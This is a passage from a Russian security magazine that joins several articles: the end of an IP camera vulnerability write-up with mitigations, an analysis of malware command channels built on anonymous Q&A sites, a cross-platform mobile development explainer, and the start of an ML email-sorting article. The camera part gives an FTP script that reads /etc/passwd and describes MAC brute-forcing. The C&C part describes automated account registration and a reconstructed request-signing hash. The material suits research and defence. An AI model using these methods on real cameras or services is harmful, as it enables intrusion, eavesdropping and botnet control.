облачные — сами соединяют ся и держат соединение с сервисом некоего
оператора.
  Использование  облака  особенно  удоб но  для  просмотра  картинки
с камеры удаленно или через мобиль ное приложение, так как не нужно
ничего настраивать, замора чиваться с ﬁrewall или NAT на роутере и иметь
белый IP.
  Зачастую функция соединения с облаком вклю чена по умол чанию, а для
активации устройства дос таточно просто подклю чить камеру к сети, зайти
на сайт облачного сервиса, ввес ти MAC камеры, логин и пароль.
  Несложно догадаться, что недоку ментированные учетные данные, забот‐
ливо вшитые китайцами из Brovotech, работа ют и тут. Можно добавлять
в свой личный кабинет чужие камеры, просто перебирая MAC‐адреса.
А облачный сервис видеонаблюдения может даже не располагать эле мен‐
тарной капчей, так что технически воз можно перебирать МАС и добавлять
камеры скриптом.
  Многие владельцы камер даже не подозревают, что камера сама может
куда‐то подключаться и управляться из обла ка. Каково?
  Не стоит забывать про UPnP, который во многих случаях по умолчанию
вклю чен на камерах, равно как и на SOHO‐роутерах. Это приводит к тому, что
камера доступна через интернет без ведома вла дель ца.
  Я слышал достаточ но историй о том, как из камеры, установленной в квар‐
тире или офисе, вдруг на окружающих обрушива лась нецензурная брань
или другая непотребщина. Это называется cam prank — если поищешь эти
слова на YouTube, найдешь много забавных роликов.
  Осложняет дело то, что исследуемые модели камер имеют не только
динамик, но и микрофон (!). Я уже не говорю, что описанные баги могут стать
неплохим подспорьем для злого хацкера, который пожелает проникнуть
в локальную сеть.
  Конечно же, я пытался донести изложенную информацию до поставщиков.
Связывался с двумя российскими компаниями, которые продают уязвимые
камеры под своим брендом.
  В одной из компаний веж ливо поб лагода рили за бдительность, но минуло
девять месяцев, а все баги на сво их местах, исправлений не выпущено.
Представитель другой компании вообще не ответил на мои письма. Печаль‐
но. В обоих случаях, как час то это быва ет, никакой программы bug bounty
у компаний нет.

Баги в реали зации FTP-сер вера
На десерт еще один баг — кривая реализация сервера FTP — он отдает
любой запрошенный файл. Для примера вот так можно дернуть тот же /etc/
passwd.


 #!/bin/bash
 HOST='_IP_адрес_камеры_'
 USER='_login_'
 PASSWD='_passwd_'
 ftp ‐n ‐v $HOST << EOT
 user $USER $PASSWD
 type binary
 get /etc/passwd ./passwd
 bye
 EOT


Для аутентификации подойдут пароли, заданные через веб‐интерфейс,
или все тот же «вол шебный захардко женный».
  Отмечу, что у меня этот баг воспроизводится не на всех прошивках, то
есть именно такой набор команд FTP работает не всегда. Полагаю, что мож‐
но поиграть с командами FTP и добить ся желаемого.


Я специально не стал рас крывать список уязвимого оборудования и давать
более детальную информацию, чтобы не помогать хулиганам учинять безоб‐
разия. Моя цель — обратить внимание на проблему.


И ЧТО С ЭТИМ ДЕЛАТЬ?
Первым делом определить, относится ли камера к группе рис ка или нет. Одна
из отличительных особенностей уязвимых камер — заголовок вида Server:
Brovotech. Проверить наличие это го заголовка можно через консоль раз‐
работчика в браузере или при помощи curl.


curl ‐I http://192.168.0.135
HTTP/1.0 302 Moved Temporatily
Server: Brovotech/2.0.0
Pragma: no‐cache
Cache‐Control: no‐cache
Content‐Type: text/html
Location: http://192.168.0.135/cn/viewer_index.asp

А еще о возможной принадлежнос ти камеры к уязвимому семейству можно
судить по открытым пор там. Повторю номера портов TCP: 21, 23, 80, 554,
1556, 1935, 6000 и 49152.
   Также можно делать выводы по наличию заголовков
 • XMailer: sz.brovotech — добавляется в email;
 • UserAgent:  www.brovotech.com/Marketing@brovotech.com —
   добавляется в HTTP‐запросы самой камеры.


Миними зация рис ков
 • Не подклю чать камеру к интернету напрямую.
 • Отключить UPnP на камере или роутере, если ты не планируешь исполь‐
   зовать этот протокол.
 • Отключить функцию соединения камеры с обла ком, если ты им не поль‐
   зуешься.
 • Изолировать камеру на уровне сети, что бы к ней было невоз можно под‐
   клю читься посторонним.
 • Изолировать камеру от локальной сети предприятия, чтобы она не могла
   стать плацдармом для атаки на сеть.
 • Понимать, что через уяз вимости в камере зло умышленник может получить
   пароли от SMTP, FTP и Wi‐Fi.
 • Понимать, что камера может иметь целый букет уязвимостей, включая
   такие, о которых в этой статье не написано.
 • Понимать, что у камеры есть не только объектив, но еще и микрофон,
   через который тебя могут прослушивать.

Ну а продавцов уязвимых камер все же про шу обра тить внимание на проб‐
лему и добиться от китайских партнеров исправлений. Хотя мне до сих пор
непонятно, на кой черт в камере Telnet и захардкоженные недоку ментирован‐
ные учетные данные.



OUTRO
Уверен, что я расковырял лишь малую часть багов и в камерах Brovotech
еще очень много интерес ного. Ах да, то, из‐за чего все затевалось, — скрипт
для автоматизации настройки камер был‐таки написан, а проект реализован.
:‐)
MALWARE



     РАЗБИРАЕМ МЕТОД ОБЩЕНИЯ
   МАЛВАРИ С C&C ЧЕРЕЗ АНОНИМНЫЕ
    СЕРВИСЫ ВОПРОСОВ И ОТВЕТОВ




      ВОПРОС
   ВРЕДОНОСА
    r3turn0riented




Создание анонимного двустороннего канала связи — пос‐
тоянная головная боль для разработчиков вредоносного
ПО. В этой статье мы на примерах разберем, как сервисы,
разработчики которых используют недостаточно сильную
защиту, могут превратиться в такой канал.


Как только не изворачиваются зло умышленни ки, что бы скрытно передавать
данные между малварью и командным центром (C&C, или, как их теперь мод‐
но называть на военный лад, C2). Сто ронние сервисы здесь зачастую пред‐
ставляются самым удоб ным вариантом. В ход идут твиты, коммиты на GitHub
или отдельные репозитории; даже комменты к видео на YouTube могут ока‐
заться тайными посланиями между машинами. Использование таких сер‐
висов открывает для операто ра ботнета новые воз можнос ти. В частности, он
может не беспокоиться о смене адресов управляющих серверов — дос таточ‐
но просто оставить твит, в приложенной к которому картинке будет содер‐
жаться актуальная информа ция.
   У односторон него канала связи есть свои недостатки. Во‐первых, такого
бота легче выявить по образцу тра фика. Во‐вторых, аккаунт на сервисе могут
заблокировать или он может попасть в поле зрения исследователей.
Это сильно затруднит дальнейшие операции.
  Создание безопасного двус тороннего канала связи с использованием
сторонних  сервисов —  задача  нетриви аль ная.  Если  не  прибегать
к каким‐либо хакам, то все, что можно предпринять в таком случае, —
это раздать ботам учетные данные, которые те будут использовать для связи
с командным сервером. То есть построить что‐то вроде такой схе мы.





Этот вариант накладывает целый ряд ограничений на проводимые опе рации.
Так, необходимо обеспечить боту воз можность оперативно обновлять учет‐
ные данные от сервиса, если старые заблокиру ют. Это не так сложно орга‐
низовать с помощью одностороннего канала связи.  Но проблема выходит
на новый уровень, когда число ботов начина ет рас ти. Большое количес тво
запросов с разных IP к одно му аккаунту будет как минимум подоз рительным.
Можно попытаться замес ти следы, реализовав сис тему распространения
учетных записей среди ботов — что бы они передавали их друг другу. Это зна‐
чительно сложнее и соз дает дополнительные статьи расходов для киберкри‐
минального бизнеса.
  Но что, если поискать возможность обходить ся без учетных записей?
В таком случае из диаграммы выше можно было бы убрать все, что связано
с логинами и паролями. И это приводит нас к ано нимным сервисам.


АНОНИМНЫЕ СЕРВИСЫ ВОПРОСОВ И ОТВЕТОВ
Один из привлекательных вариантов — исполь зовать сервисы анонимных
вопросов и ответов типа Ask.fm, Sprashivai.ru и прочих. Вот почему они так
хорошо годятся:
 • они работают по HTTP и как минимум поддерживают HTTPS;
 • адреса сервисов анонимных вопросов и ответов известны вендорам secu‐
   rity‐решений и присутс твуют в белых списках модулей Application Control &
  URL Filtering;
 • разработчикам таких сервисов не интерес на безопасность собственных
   решений, а техподдержка пассивна.

С первыми двумя пункта ми все понят но. HTTP практически везде раз решен,
а HTTPS позволит еще и замаскировать обращения к сервису. Что касается
Application Control и всего такого, то как минимум тра фик от ботов будет счи‐
таться «развлекательным». Это ско рее создаст проблемы для сотрудника,
на компьютере которого работа ет бот, чем реаль но приведет к раскры тию.
  В последнем пункте мне довелось убедиться лично. В феврале 2017 года
я отправил сотрудникам техподдержки сервиса Sprashivai.ru информацию
о том, что их защита от спама не работа ет, а предпринятые пос ле слива меры
безопасности эту самую безопасность подрывают. Для меня не стало неожи‐
данностью то, что они полностью проигнорировали мой репорт. Не думаю,
что ситуация с другими сервисами кардинально отличается.
   Как именно реализуется двус торонний канал свя зи на основе таких сер‐
висов? Эту задачу можно раз бить на два этапа:
 1. Формирование устойчивого канала связи для передачи данных в нап‐
   равлении от бота к операто ру.
 2. Формирование канала связи для передачи данных от опе ратора к ботам.

Начнем по порядку.


КАНАЛ СВЯЗИ «ОПЕРАТОР — БОТ»
На этом этапе ничего особенно слож ного. Большая часть мал вари, которая
использует какие‐либо сервисы для обеспечения одностороннего канала
связи, работает имен но по этой схеме. В контексте сервисов вопросов
и ответов это реализуется, нап ример, следующим образом:
 • оператор «отвечает» на вопрос и прикладывает к ответу изображение,
   содержащее в закодированной форме команды для ботов;
 • бот проверяет, не появились ли новые данные в используемом операто‐
  ром аккаунте, и выполняет необходимые действия.

Здесь есть несколь ко интересных моментов. Когда‐нибудь малварь будет
обнаружена, и используемый акка унт рас кро ют и заблокиру ют, как бы его
ни защищал оператор. Поэто му в таких случаях прибегают к механизмам
автоматического создания учетных записей — эти механизмы уже хорошо
отработаны авторами вредоносного ПО и исполь зуются для соз дания домен‐
ных имен.
   Это приводит разработчика вредоноса к следующей проблеме: чтобы
автоматизировать регистра цию аккаунтов (да и авторизации тоже), скорее
всего, потребуется найти метод обхода капчи. Рассмотрим эти методы
на примерах выбранных нами сервисов.


Ре гистрация
Sprashivai.ru использует ReCaptcha, поэтому для автоматической регистра‐
ции аккаунтов нужно будет оза ботиться обходом такой защиты.





POST‐запрос на регистра цию акка унта Sprashivai.ru выглядит так.





Ask.fm же не содержит вообще никакой защиты от авторега. Форма регистра‐
ции не требует ввода кап чи, а ито говый запрос имеет следующий вид.





Единственный момент, который здесь нуж но учесть, состоит в отправке
на сервер параметра authenticity_token, который включен в код страницы
регистрации и выглядит пример но так:


<input type="hidden" name="authenticity_token" value="KljYiKgJAeDD6L0
RDjh/kuvdelt2UmtML90xBs7D4vGfK3UkdW8o+Men4tzhYmgWBrj4kGqw25ERd
f9Mg9eK5Q==" />

В общем, с автоматичес кой регистра цией для Ask.fm нет никаких проблем,
достаточно сделать два запроса: один — для получения токена, сес сии
и прочей информации, дру гой — с целью регистрации аккаунта.


Авторизация
Оператору нужно иметь возможность авто матизировать, кроме регистрации,
процесс авторизации с зарегистрированными учет ками. Ни Sprashivai.ru,
ни Ask.fm не исполь зуют капчу при аутентифика ции пользователя, что сущес‐
твенно упрощает задачу.
  При этом Sprashivai.ru вычисляет хеш пароля на стороне клиента и отсы‐
лает серверу уже его, а не сам пароль в откры том виде.
   Вот так выглядит запрос на авторизацию в сервисе Sprashivai.ru.





И для Ask.fm соответственно.





Опять‐таки на Ask.fm мы видим, что в коде стра ницы с вопросом содержится
параметр authenticity_token.


Пуб ликация информации для ботов
Тут все так же просто. Первый запрос оператора должен собирать име‐
ющиеся вопросы, а второй — отвечать на них так, чтобы сам ответ или при‐
ложенная информация несла в себе полезную наг рузку для ботов.  Я не буду
прикладывать сюда скриншоты зап росов, поскольку они выглядят аналогич‐
но. Если есть желание, можешь взять Burp Suite и самос тоятельно убедиться,
что в запросах нет никакой магии.


КАНАЛ СВЯЗИ «БОТ — ОПЕРАТОР»
Этот канал связи реализуется через отправку анонимных отве тов. Сервис
Sprashivai.ru, если мне не изменяет память, всег да поддерживал такую воз‐
можность без авторизации пользователя, а вот на Ask.fm она появи лась срав‐
нительно недавно. 
   Анонимный вопрос пользователю Ask.fm в виде запроса выглядит пример‐
но так.





Производится POST‐запрос к /<account_name>/ask, содержащий уже зна‐
комый нам authenticity_token из кода страницы и сам вопрос. Интересно,
что задаваемый вопрос дублируется в Cookie, отправляемой в запросе, —
это нужно учесть при автоматизации про цес са.
  Для Sprashivai.ru картина немного иная.





В параметрах видно имя акка унта, флаг, означающий, что вопрос будет задан
анонимно, а также сам вопрос и два странных хеша. В процессе авторизации
мы уже встречали нечто подобное — похоже, разработчики Sprashivai.ru
просто питают нездоровую тягу к хешированию.  Хорошая новость состоит
в том, что значение параметра hash при сутс твует в коде страницы, с которой
мы и пытаемся отправить воп рос пользователю.



Отсюда вытекает и вто рая новость, но уже плохая — значения параметра sig
на странице нет. По всей видимос ти, оно вычисляется в ходе работы
какого‐то скрипта. А это зна чит, что для восста новления алгоритма генера‐
ции этого параметра нам нуж но реверсить обфусцированный JavaScript.
  Дебаггер Firefox позволяет определить функцию, которая генерирует зна‐
чение sig. Как видно, значение это го парамет ра формиру ется функцией
hash_ask с двумя параметрами.





Сама функция hash_ask() описана в скрипте secure.min_2015_06_26.js и выг‐
лядит следующим образом:


function hash_ask(r,e){
    var t="2O889rz3A5K30hxi8cazk7UcJY8623tBNGMLW49R" +
    e + r +
    "bDM808Lt8g647vlGhDtbCRhvxBkJyNkmjn8574zT";
    return secr(t)
}

С помощью отладоч ных средств, встроенных в Firefox, мне удалось узнать, что
параметр r функции hash_ask равен зна чению переменной hash, которая
передается в запросе и содержится в коде стра ницы, а e — имени поль‐
зователя, которому задается вопрос.
  Проблема в том, что нам нужно найти зна чение, которое возвращает фун‐
кция secr(). Ее определение отсутству ет и в этом файле, и во всех осталь‐
ных.
   Тут я совершил промашку, которая стоила мне лишних тру дов. В secure.
min_2015_06_26.js содер жится какой‐то скры тый обфускацией код, и я
решил его отладить и деобфусцировать. Спус тя несколько часов кропот‐
ливой работы с Rhino я обнаружил, что этот код, по сути, счи тает SHA‐
256 от входной строки.
  На самом деле это не нужно. Если прогнать значение sid через hashid, то
мы узнаем, что это 256‐битный хеш от некой строки.





А в коде скрипта можно заметить отсылки к SHA‐224, что, видимо, указывает
на алгоритм хеширования. Про верка этой теории сэкономила бы мне уйму
времени и нервов. Также мне удалось нагуглить нес колько страниц с этим же
кодом на разных форумах. Не исключено, что это занятие привело бы к нуж‐
ному результату еще скорее.
  Но вернемся к решению изначального воп роса. Чтобы сгенерировать зна‐
чение параметра sig, нам нуж но взять строку hash из кода страницы, имя
пользователя и еще несколько строк и сформировать хеш SHA‐256 от этого
значения.
  Почти год назад я доложил создателям сервиса Sprashivai.ru, что такая
защита как минимум не работа ет, и соз дал репози торий на GitHub c кодом,
который позволяет автоматичес ки задавать вопросы конкретному поль‐
зователю. Уверен, что этот код позволит желающим разобраться в теме в том
случае, если я что‐то непонятно описал.


ВЫВОДЫ
Как мы убедились, анонимные сервисы воп росов и ответов можно без проб‐
лем использовать для управления вредонос ным софтом. У Ask.fm нет никакой
защиты от этого, а Sprashivai.ru в качестве защиты использует некорректную
методику. Наверняка мно гие дру гие анонимные сервисы тоже подойдут.
    Тем не менее у такого метода есть ряд существенных проблем. Во‐пер‐
вых, при передаче данных от бота к сервису нужно как‐то кодировать переда‐
ваемые данные для того, чтобы избежать лишних подозрений. Во‐вторых,
стихийное возрастание количества посети телей некоторых аккаунтов также
может привлечь к себе внимание администрации ресурсов. Как снизить эти
риски — решать не нам.
 КОДИНГ

   НАТИВНО
   ИЛИ НЕТ?





                            100
                 МИФОВ
   Вячеслав Черников           О КРОСС‐
   Руководитель отдела
 разработки компании Bin‐
     well. Cпециалист поплатформам Xamarin и Azure      ПЛАТФОРМЕННОЙ
slava.chernikoff@binwell.com           РАЗРАБОТКЕ*
                                                      *ЧЕТЫРЕ В ДЕСЯТИЧНОЙ СИСТЕМЕ СЧИСЛЕНИЯ




 Смартфоны продолжают отво евывать все больше места
  под солнцем не только как инструмент потребления фотог‐
 рафий котиков и ххх‐роликов, но и в качестве рабочего инс‐
  трумента. Поэтому и спрос на мобильную разработку растет.
 Принято считать, что тру и кул — это  Objective‐C/Swift
  для iOS и Java/Kotlin для Android. Спору нет, тру и кул,
  но существует большое количество реальных сценариев,
  в которых использование кросс‐платформенных фрей мвор‐
  ков более предпочтительно в сравнении с нативными инс‐
  трументами.


  Одни разработчики ждут от кросс‐платформенных фреймворков решения
  всех своих жизненных проблем, дру гие же воспри нимают их в шты ки. В обоих
  «враждующих лагерях» есть свои заб луждения, выз ванные непони манием
   того, как и что работает. Это подливает мас ла в огонь, так как вместо тех‐
  нических доводов в ход идут эмо ции.
     Также среди разработ чиков, осо бен но начинающих, существует множес‐
  тво мифов о кросс‐платформенных мобильных фреймворках. В нашей статье
  мы разберем самые популярные из них. Но для начала посмотрим на мобиль‐
  ную разработку  глазами бизнеса, дающего день ги на весь айтишный
  блек‐джек.


  ЗАЧЕМ НУЖНЫ КРОСС-ПЛАТФОРМЕННЫЕ ИНСТРУМЕНТЫ?
  Исторически на рынке компь ютеров всегда была конкуренция, и каждый про‐
  изводитель предоставлял оптимальный набор так называемых нативных (род‐
  ных) инструментов для раз работки приложений под свои операционные сис‐
  темы и устройства.
    Нативные инстру мен ты = пре доставляются владельцем эко сис-
  темы.
    Все  остальные  признаки  «нативности»  ВТОРИЧНЫ —  поведе ние
  и интерфейс приложений, доступ к возможностям ОС, производительность
  и прочее.
    К тому же практически всегда оказыва лось, что нативные инс трументы
  несовместимы друг с другом не только на уровне языков раз работки, при‐
  нятых соглашений и архитектур, но и на уровне механизмов работы с опе‐
  рационной системой и библиотеками. В результате для реализации одних
  и тех же алгоритмов и интерфейсов требовалось написать приложение
  для нескольких сред на раз ных языках программирования, а потом его под‐
  держивать из расчета «одна команда на платформу». При этом воз можнос ти
  и внешний вид приложений на раз ных платформах практически всегда иден‐
  тичны на 90%. Сравни ради интереса реализацию любимых программ для iOS
  и Android.
     Второй важный момент — наличие необходимых знаний и опы та внутри
  команды: если их нет, то потребуется время на обучение.
    Для того чтобы решить обе эти проб лемы, на рынке уже давно появились
  инструменты кросс‐плат форменной раз работки (не только mobile), предлага‐
  ющие:
   • максимизировать общую базу кода на едином языке программирования,
     чтобы продукт было про ще разрабатывать и поддерживать;
   • использовать существующие компетенции и специалистов для реали‐
     зации приложений на новых платформах.

  Так как языков программирова ния (и сред) сейчас наплодилось очень много
   (и  специалистов,  вла деющих  этими  языками),  то  и  инструментов
  для кросс‐платформенной раз работки существу ет изрядное количество. Мы
  в качестве примера остановимся на популярных в наших краях PhoneGap,
  Xamarin, React Native и Qt.





  Теперь можно поговорить и о мифах.


 МИФ 1. МАГИЯ
  Самый частый миф, будора жащий умы начинающих девелоперов, связан
  с верой в сверхалгоритмы (и сверхпрограммис тов, их создавших), которые
  волшебным  образом  превращают  кросс‐плат форменные  приложения
  в нативные. Что‐то в духе «преобра зования кода JavaScript в Swift и даль‐
  нейшая компиляция уже Swift‐приложения». Этот миф подогревают и сами
  разработчики кросс‐платформенных инстру ментов, обещая на выходе соз‐
  дание «нативных приложений». И не то чтобы кто‐то здесь лукавил, но богатая
  фантазия и непонимание базовых механизмов иногда наводят разработчиков
  на мысли о шаманских приемах.
     Главный принцип, лежащий в основе кросс‐платформенных решений, —
  разделение кода на две час ти:
   • кросс‑платформен ную, живущую в виртуальном окру жении и име ющую
     ограниченный доступ к возможнос тям целевой платформы через спе‐
     циальный мост;
   • нативную, которая обеспечивает инициализацию приложения, управле‐
     ние жизненным цик лом ключевых объектов и имеет полный доступ к сис‐
    темным API.





  Для того чтобы связывать между собой мир «нативный» и мир «кросс‐плат‐
  форменный», необ ходимо использовать специаль ный мост (bridge), имен‐
  но он и определяет возможности и ограничения кросс‐платформенных фрей‐
  мворков.
    При использовании bridge производительность всегда снижается за счет
  преобразования данных между «мирами», а также конвертации вызовов API
  и библиотек.
     Итак, все кросс‐платформенные приложения обязаны иметь нативную
  часть, иначе операционная система просто не сможет их запустить. Поэтому
  давай рассмотрим под робнее, какие системные API и механизмы предос‐
  тавляются самими iOS, Android и Windows. Переходим к следующему мифу.


 МИФ 2. НЕНАТИВНО!
  Итак, у нас есть кросс‐плат форменная часть при ложе ния, живущая в вир‐
  туальном окружении и вза имо действующая с операционной сис темой через
  инфраструктуру фреймворка и мост.
    Все опе рационные системы: iOS, Android и Windows UWP — пре дос тавля‐
  ют доступ к следующим подсистемам (наборы сис темных API):
   • WebView (встроенный в приложение веб‐браузер) используется в гиб‐
     ридных приложениях на базе PhoneGap и фактичес ки выступает средой
     выполнения локального веб‐сайта;
   • JavaScript‐движки используются в React Native и аналогах для быстрого
     выполнения JS‐кода и обмена данными меж ду Native и JS;
   • OpenGL ES (или DirectX) используется в игровых движках и приложениях
     на Qt/QML или аналогах для отрисовки интерфейса;
   • UI‐подсистема отвечает за нативный пользовательский интерфейс при‐
    ложения, что актуально для React Native и Xamarin.





  Кросс‐платформенные приложения имеют нативную часть и такой же пол ный
  доступ к системным API, что и «нативные» приложения. Разница в том, что
  вызов системного метода идет через мост и инфраструктуру фреймворка:
    WebView — приложение живет в своем веб‐браузере по аналогии
  с одностраничным веб‐сайтом. Нет доступа к нативным контролам (кнопки,
  списки и прочее), все основано на HTML/CSS/JavaScript. С другой стороны,
  веб‐разработчик почувствует себя как рыба в воде.
     JavaScript-движ ки стали популярны относительно недавно, так как в iOS
  подобный механизм был добавлен только в версии 7.0. Из особенностей сто‐
  ит учитывать необходимость сериализации в JSON сложных структур данных,
  передаваемых между средами JavaScript и Native. Если коротко опи сать
  подобный  класс  решений,  то  в  JavaScript‐среде выполняется  JS‐код,
  управляющий натив ным приложением.
    OpenGL ES и DirectX являются подсистемами низкого уровня и исполь‐
  зуются для отрисовки пользовательского интерфей са в играх и, например,
  Qt/QML. То есть при использовании OpenGL/DirectX разработчики сами
  рисуют контролы и анимации, которые могут быть лишь похожи на нативные.
  С другой стороны, это подсистема низкого уровня с очень высокой произво‐
  дительностью, поэтому она используется и в кросс‐платформенных игровых
  движках.
    Все кросс‐платформенные приложения имеют нативную часть, а следова‐
  тельно, потенциально такой же полный доступ к сис темным API, что и «натив‐
  ные». Также кросс‐платформенные приложения собираются и упаковы ваются
  «нативными» инструментами в «нативные» установочные пакеты. Ключевой
  вопрос — как организовано взаимодействие меж ду кросс‐платформенной
  частью и нативной. Например, внутри WebView или с помощью Open GL ES /
  DirectX нет возможности соз дать поль зователь ский интерфейс с полностью
  нативным look’n’feel, но при этом есть полный дос туп к GPS, Push‐уведом‐
  лениям и другой функциональнос ти. А код на JavaScript или C# впол не сво‐
  бодно может управлять нативным приложением и его поведением, обес‐
  печивая полностью нативный look’n’feel.
     Если резюмировать — то да, «ненативно» с точки зре ния используемых
  инструментов разработки (не от Apple, Google). Но приложение может быть
  полностью нативным с точки зрения дос тупа к системным API и обеспечивать
  полностью нативный внешний вид и поведение. А мы дви жемся к следующему
  мифу.


 МИФ 3. КОСТЫЛЬ НА КОСТЫЛЕ
  Здесь стоит понимать, что нативные API по умол чанию костылями не считают‐
  ся (хотя и здесь есть раз ные мнения), поэтому все негодование направлено
  на кросс‐платформенную часть. Очевидно, что исполняющую среду (нап‐
  ример, WebView, JavaScript‐движок или Mono) костылем тоже наз вать слож‐
  но — взрослые зрелые решения с длительной исто рией.
    Похоже, что костылем называют  то, как кросс‐платформенная часть
  интегрируется с нативной. Что бы лучше понять, как работают различные
  фреймворки, мы на примере PhoneGap, Xamarin, Qt и React Native рассмот‐
  рим те механизмы операционных систем, которые используются для свя зыва‐
  ния кросс‐платформенной и «нативной» частей.
     Начнем мы с PhoneGap. Ниже представлена верхнеуровневая архитектура
  приложения на базе это го фреймворка.





  Приложение на PhoneGap — это по факту нативное приложение, которое
  в качестве единственного UI‐контро ла отоб ражает WebView. Именно через
  него и идет взаимодействие с нативной частью. Все стандартные WebView
  в iOS, Android и Windows UWP поддерживают воз можность добавить свои
  нативные обработчики для JS‐свойств и методов. При этом JS‐код живет
  в своей изолированной среде и ничего не зна ет о нативной части — просто
  дергает нужные JS‐методы или меняет нуж ные JS‐свойства. Все внутри стан‐
  дартного вебов ского DOM, в который прос то добавляются новые эле менты,
  связанные с нативной реализацией.
    Далее рассмотрим React Native.





  При создании приложений на React Native раз работчику практически всегда
  будет необходимо реализовывать нативную часть на Objective‐C, Java или C#,
  а само управление нативным приложением будет идти из JavaScript. По факту
  JavaScript‐движок — это элемент WebView, который доступен отдельно. Вза‐
  имодействие идет через такой же JS‐мост, как и в случае с PhoneGap. Однако
  в React Native JS‐код управляет не вебовским DOM‐деревом, а нативным
  приложением.
    Необходимо учитывать, что из‐за ограничений iOS (нет возможности
  реализовать JIT) код JavaScript на лету интерпретируется, а не компилиру‐
  ется. В целом это не особо сказывается на производительнос ти в реальных
  приложениях, но помнить об этом сто ит.
     Теперь рассмотрим классический  Xamarin.iOS и  Xamarin.Android,  так
  как Xamarin.Forms (поддерживающий Windows UWP) — это надс тройка
  над ними.





  Xamarin использует библиотеку Mono для взаимодействия с целевой опе‐
  рационной системой, которая поз воляет вызывать нативный код с помощью
  механизма P/Invoke. Он же задейству ется и для общения с нативными API
  в iOS/Android. То есть для всех публичных нативных API‐методов создаются
  обертки на C#, которые, в свою очередь, вызывают системные API. Таким
  образом, из Xamarin‐приложения можно обра щаться ко всем сис темным API.
    И в завершение рассмот рим Qt, так как о нем появляется много вопросов
  от опытных разработчиков.





  Qt — «вещь в себе», в этом есть и плюсы, и огра ничения. Библиотеки Qt
  просто подключаются к системным API на C++, которые есть во всех опе‐
  рационных системах. Для отрисовки пользователь ского интерфейса исполь‐
  зуются механизмы низкого уровня, но свой графичес кий движок, поддержи‐
  вающий стилизации «под нативку». При этом на Android приходится обра‐
  щаться к Java API через специальный мост (JNI bridge), а для Windows UWP
  использовать конвертер вызовов Open GL ES в DirectX, так как Open GL
  недоступен для UWP.
    Подведем итог: все кросс‐платформенные фреймворки используют стан‐
  дартные нативные возможности операционных сис тем, являются зрелыми,
  создаются опытными командами и сооб ществом open source при поддержке
  гигантов IT‐индустрии. И наконец, пришло время для самого «сильного» аргу‐
  мента.


 МИФ 4. МЕДЛЕННО
  Важный козырь, которым любят пользоваться в спо рах о кросс‐платформен‐
  ных фреймворках, — низкая производительность. Опять же, смотря что с чем
  сравнивать и в каких попуга ях считать.
    Напомним, что особенность кросс‐плат форменных приложений заключа‐
  ется в параллельном существовании двух миров, связанных мос том:
   • PhoneGap: HTML/JS и Native Java / Objective‐C / C#;
   • React Native: JS и Native Java / Objective‐C / C#;
   • Xamarin: Mono и Native Java / Objective‐C;
   • Qt: С++ и Native Java / Objective‐C.

  Таким образом, при сравнении про изво дительнос ти надо учитывать скорость
  работы:
   • кросс‐платформенной час ти;
   • нативной части;
   • моста.

  Если набрать в поисковике, например, react native vs swift performance, то
  можно посмотреть множес тво различных тес тов, и во многих из них отме чает‐
   ся, что производительность рез ко падает при активном использовании мос‐
   та, включая активное манипулирование UI из кросс‐платформенного кода.
  Для Xamarin ситуация выглядит таким же обра зом — кросс‐платформенная
  часть очень быстра и сопос тавима с нативной в обработке данных, однако
  при использовании моста может падать производительность. Qt вообще
  работает на уровне С++, который быстр сам по себе. Если же рас сматривать
  решения на базе PhoneGap, то здесь производительность будет сильно
  зависеть от WebView, но все же не следует активно менять UI в JavaScript‐
  коде или проводить научные вычисления.
    Медленно? Да, возможны падения произво дительности при неуме лом
  взаимодействии с операционной системой через мост. Однако сами по себе
  кросс‐платформенные миры такие же быс трые, как и нативные.


 ЗАКЛЮЧЕНИЕ
  Сегодня мы рассмотрели устройство популярных кросс‐платформенных
  мобильных фреймворков и разобрали основные мифы, которы ми они окру‐
  жены. Оставайся на свя зи!
КОДИНГ
PYTHON’ОМ
ПО МАШИНЛЕРНИНГУ

РАЗГРЕБАЕМ ТОННЫ
ВХОДЯЩЕЙ КОРРЕСПОНДЕНЦИИ
БЕЗ УЧАСТИЯ ЧЕЛОВЕКА





   Евгений Григоренко                                                           Стас Павлов




Сегодня  только  ленивый  не  говорит  (пишет,  думает)
про машинное обучение, нейросеточки и искусственный
интеллект в целом. Я помню, как все го лишь в прошлом году
ML сравнили с подростковым сексом — все хотят, но никто
не занимается. Сегодня все озабочены тем, что ИИ нас
оставит без работы. Хотя, судя по последним исследова‐
ниям Gartner, можно успокоиться, так как к 2020 году бла‐
годаря ИИ появится больше рабочих мест, чем ликвидиру‐
ется. Так что, дорогой друг, учи ML, и будет тебе счастье.


В этой статье мы хотим показать ML на практичес ком кейсе — на при мере
проекта, который мы делали для Ак тион‑пресс (сервис онлайн‐подписки).
Уверен, описанное в этом примере может при годиться многим. Почему мно‐
гим? Да потому, что проблема, которую мы решали, называлась «сортировка
и пересылка по адресу огромного количес тва электронных писем». Проб лема
гигантской  переписки,  которую  менеджерам  приходится  сортировать
и пересылать  в  соответству ющие  отделы,  практически  универсальная,
и проблему эту надо решать современными спо собами.
   Итак, после консультаций с заказ чиком мы решили разработать модель
машинного обучения для максимально воз можной автоматизации сортиров‐
ки писем.


             INFO

                     Изначально  статья  называлась Операци она‐
                    лиза ция  ML‐моделей  Python  с  исполь‐
                    зованием Azure Functions. Думаю, тебе сто ит
                         узнать об этом сейчас, потому что дальше лег ко
                      не будет. :)



МОДЕЛЬ МАШИННОГО ОБУЧЕНИЯ
Думаю, тебя не удивит, что в качестве языка для этого решения мы выбрали
Python. Так сложилось историчес ки: он высокоуровневый, а самое важное —
в нем есть множество полезных библиотек для машинного обучения. Про них
я расскажу ниже.
   Честно говоря, про ML в данном случае рас сказывать особо нечего.
Набор простых бинарных клас сифика торов на основе логистической рег‐
рессии показал многообещающие результаты и поз волил несколько абс тра‐
гироваться от самой модели, сосредото чившись на подготовке данных и пос‐
троении  вложенного  текста. Но сам  репози торий  уже  использовался
как основа для трех дру гих независимых про ектов: он хорошо показал себя
в нескольких классификационных экспериментах и зарекомендовал себя
как надежный фундамент для быс трого перехода к разработке. Поэтому
задача данного раздела заключается не в демонстра ции «ноу‐хау»; он нужен
как основа для следующего за ним раз дела, пос вященного операционализа‐
ции.
   Здесь я поделюсь своим опытом и дам некото рые рекомендации тебе,
чтобы ты мог сам поэкспериментировать с этим кодом или повторно исполь‐
зовать его.


        WWW

                       Чтобы сохранить конфиденциальность, исходный
                      набор дан ных был заменен аналогичным обще‐
                      доступным набором для классификации отзывов
                      о McDonalds. См. файл data/data.csv.


Сами данные были представлены в файлах CSV с тремя стол бцами: Id, Text
